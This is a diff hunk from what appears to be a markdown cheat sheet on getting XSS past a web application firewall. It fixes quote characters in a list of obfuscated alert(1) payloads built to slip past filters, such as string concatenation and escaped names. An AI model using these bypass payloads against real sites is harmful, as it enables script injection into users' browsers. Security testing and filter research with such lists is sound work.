@@ -1122,11 +1122,11 @@ This request will pass through the WAF and an XSS attack will be conducted in ce
 - `(alert)(1)`
 - `a=alert,a(1)`
 - `[1].find(alert)`
-- `top[“al”+”ert”](1)`
+- `top["al"+"ert"](1)`
 - `top[/al/.source+/ert/.source](1)`
 - `al\u0065rt(1)`
-- `top[‘al\145rt’](1)`
-- `top[‘al\x65rt’](1)`
+- `top['al\145rt'](1)`
+- `top['al\x65rt'](1)`
 - `top[8680439..toString(30)](1)`
 - `alert?.()`
 - `(alert())`
